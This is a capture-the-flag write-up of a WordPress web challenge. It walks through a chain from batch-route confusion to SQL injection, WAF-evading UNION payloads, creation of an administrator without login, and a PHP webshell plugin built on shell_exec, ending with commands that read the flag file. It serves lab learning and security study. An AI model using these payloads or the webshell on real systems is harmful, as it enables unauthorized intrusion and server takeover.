# Egg — Web Exploitation

**Competition:** Compfest CTF 2026  
**Category:** Web Exploitation  
**Challenge:** Egg  
**Solved target:** `http://34.2.22.80:30037`

## Flag

```text
COMPFEST18{th3_3gg_h4s_h4tch3d_PKB5OBIIr11KLIKr}
```

## 1. What we are given

The challenge gives us a web address and a CTFd proxy token. The token is
needed on every request because it is the challenge gate:

```text
ctfd_cd51cfedc02b9a9937d29b14abc9d90f41f78a15910e91d260788cd78f44e4ca
```

If the challenge is restarted, the port may change. Replace the port in the
commands below with the new one.

The first important lesson is that the token is not a WordPress password. It
only lets our requests reach the challenge instance. We still need to find a
vulnerability in the application behind the gate.

## 2. Identifying the application

Opening the site shows a WordPress installation. The REST API is also
enabled, so the following request is useful for reconnaissance:

```bash
curl -i \
  -H "Cookie: ctfd_proxy_token=YOUR_TOKEN" \
  http://34.2.22.80:30037/wp-json/
```

The response contains normal WordPress REST routes such as `wp/v2/posts`,
`wp/v2/users`, and `wp/v2/categories`. The WordPress version exposed by the
instance was `7.0.0`.

The page source also contained a challenge-specific hint pointing to:

```text
/i-am-using-an-ai-agent
```

Visiting that path returns an acknowledgement. It is a clue, not the final
flag.

## 3. Finding the interesting REST endpoint

WordPress has a batch endpoint that accepts several REST requests in one
HTTP request:

```text
POST /wp-json/batch/v1
```

A harmless probe is:

```bash
curl -i \
  -X POST \
  -H "Cookie: ctfd_proxy_token=YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  --data '{"requests":[]}' \
  http://34.2.22.80:30037/wp-json/batch/v1
```

The endpoint responds with HTTP status `207`, which means that the batch
route exists and processed the request.

### What is route confusion?

The batch handler validates each nested request and stores information about
which handler should answer it. A malformed request can make validation add
an error entry while the handler-matching information becomes offset by one.
The next request is then dispatched using the wrong handler.

The public proof of concept commonly uses a malformed path such as `///`.
This challenge WAF blocks that spelling. The alternate primer used here is:

```json
{"method":"POST","path":"http://"}
```

`http://` is not a normal WordPress REST path, so it still produces the
needed parser error, but it avoids the challenge's blocked primer strings.

The result is that a nested request intended for one REST route can be
handled as a request for the posts collection.

## 4. Turning the route confusion into SQL injection

The vulnerable request parameter is `author_exclude`. Internally,
WordPress converts this into the `author__not_in` query argument. In a
vulnerable version, the value is eventually placed inside a SQL `NOT IN`
expression without being safely treated as an integer list.

Normally the application may construct SQL conceptually similar to:

```sql
... WHERE post_author NOT IN (user supplied value)
```

If we send a value beginning with `0)`, the `)` closes the original list. We
can then append a condition:

```text
0) AND (SELECT 1)=1-- -
```

The pieces mean:

| Piece | Meaning |
| --- | --- |
| `0)` | Closes the original `NOT IN (...)` expression. |
| `AND (SELECT 1)=1` | Adds a condition which is true. |
| `-- -` | Comments out the rest of the original SQL statement. The space after `--` matters in MySQL. |

The false version is:

```text
0) AND (SELECT 1)=0-- -
```

If the true version returns posts and the false version returns no posts, we
have a boolean SQL injection oracle. An oracle is simply a yes/no signal that
lets us learn information one bit or one character at a time.

### Bypassing the challenge WAF

The WAF blocks obvious text such as `UNION SELECT`, `SELECT `, and `AND (`.
SQL comments are ignored by MySQL, so these two spellings are equivalent to
the database:

```text
UNION SELECT
UNION/**/SELECT
```

The second spelling does not contain the exact blocked phrase. The runner in
`solve.py` decodes each nested URL query, inserts comments between the SQL
keywords, and URL-encodes the query again before sending it.

This detail is important: the SQL is URL-encoded inside JSON, so changing the
already encoded string directly can corrupt the payload.

## 5. Reading data with an in-band UNION

Blind extraction works, but it requires many requests. The challenge also
allows an in-band UNION technique. In an in-band technique, the database
result is reflected directly into the HTTP response.

The posts query has 23 columns. The exploit creates a fake post row with a
marker in the `post_title` column:

```sql
CONCAT(0x7c7c, HEX(CAST((SELECT 0x4f4b) AS CHAR)), 0x7c7c)
```

The hexadecimal constants are just an encoding that avoids quote and filter
issues:

```text
0x7c = |
0x4f = O
0x4b = K
```

Therefore a successful response contains a marker equivalent to:

```text
||4f4b||
```

The helper decodes that marker back to `OK`. The same primitive can read
database values such as the table name and administrator ID.

## 6. Creating a temporary administrator

The next part of the chain is easier to understand if we split it into its
goal and its implementation:

1. We want a WordPress administrator account so that we can use normal admin
   functionality.
2. The UNION primitive lets us forge rows that WordPress believes came from
   its posts table.
3. Those rows seed an oEmbed cache and a Customizer changeset.
4. The Customizer is made to operate with the ID of an existing administrator.
5. A nested REST request to `POST /wp/v2/users` is then performed with the
   supplied username, password, email, and administrator role.

This is a pre-auth account-creation chain: we do not need to know an existing
administrator's password, and we do not need to crack a password hash. The
exploit creates a fresh random account such as:

```text
username: wp2_<random value>
password: Wp2!<random value>
```

The account is temporary and exists only to complete the challenge.

## 7. Logging in and uploading a plugin

With the generated credentials, the runner performs the normal WordPress
login flow at `/wp-login.php`.

WordPress protects the plugin upload form with a nonce. A nonce is a short
anti-CSRF value which proves that the request came from a valid WordPress
admin page. The runner requests:

```text
/wp-admin/plugin-install.php?tab=upload
```

It extracts the upload nonce and submits a ZIP file containing a very small
PHP plugin. The plugin is token-gated:

```php
if (hash_equals($token, $_GET['t']) && isset($_GET['c'])) {
    echo shell_exec($_GET['c']);
}
```

The actual helper adds response markers around the output so that the runner
can distinguish command output from the rest of the HTML page. The `t`
parameter is random and is not the CTFd proxy token.

One small implementation detail matters here. The CTFd cookie must remain on
the request, while WordPress adds its own login cookies. `solve.py` combines
both cookie sets after login. Without this, WordPress sends us back to the
login page when we request the plugin upload form.

## 8. Finding and reading the flag

The webshell first runs a harmless identity command:

```bash
id
```

It reports the web-server account, `www-data`. It then searches for
flag-named files:

```bash
find / -maxdepth 5 -type f -iname '*flag*' -print 2>/dev/null
```

The target contains:

```text
/flag.txt
```

Reading it gives:

```text
COMPFEST18{th3_3gg_h4s_h4tch3d_PKB5OBIIr11KLIKr}
```

## 9. Reproducing the solve

The directory contains:

| File | Purpose |
| --- | --- |
| `solve.py` | Challenge-specific runner. It applies the WAF bypass, creates the temporary admin, uploads the plugin, and reads flag-named files. |
| `wp2shell.py` | The reusable WordPress batch/SQLi/admin/plugin helper used by the runner. |

The scripts use only the Python standard library. From this directory, run:

```bash
python solve.py \
  http://34.2.22.80:30037 \
  ctfd_cd51cfedc02b9a9937d29b14abc9d90f41f78a15910e91d260788cd78f44e4ca
```

On Windows PowerShell, the same command can be written on one line:

```powershell
python .\solve.py http://34.2.22.80:30037 ctfd_cd51cfedc02b9a9937d29b14abc9d90f41f78a15910e91d260788cd78f44e4ca
```

Expected high-level output is:

```text
[*] Creating a temporary administrator through the SQLi chain ...
[+] Username: wp2_...
[+] Password: Wp2!...
[*] Logging in and uploading the token-gated plugin ...
[+] Running as: uid=33(www-data) gid=33(www-data) groups=33(www-data)
[+] /flag.txt:
COMPFEST18{th3_3gg_h4s_h4tch3d_PKB5OBIIr11KLIKr}
```

## 10. Troubleshooting

### The port no longer works

The instance is restarted by the CTF infrastructure. Use the new host and
port, and keep the token from the challenge panel.

### The response is `403` with a WAF debug code

Do not use the stock `///` primer or plain `UNION SELECT` against this
instance. Run `solve.py`; it uses the alternate `http://` primer and inserts
MySQL comments into blocked keyword sequences.

### Login succeeds but the upload nonce is missing

This usually means the WordPress login cookies were not sent with the next
request. Use the supplied `solve.py`, which explicitly combines the CTFd and
WordPress cookies.

### The UNION primitive is unavailable

The chain depends on the vulnerable WordPress version and on the target's
object-cache configuration. Confirm that the target is the intended Egg
instance, that the CTFd token is current, and that the challenge has not been
restarted between steps.

## 11. Cleanup

The exploit creates a temporary WordPress administrator and uploads a plugin
containing a command-execution endpoint. On a disposable CTF instance this is
normally cleaned up by restarting the challenge. On any persistent system,
delete the generated user and remove the uploaded `wp2shell_*` plugin
immediately after testing.

Only use this technique on the CTF instance or on systems for which you have
explicit authorization.
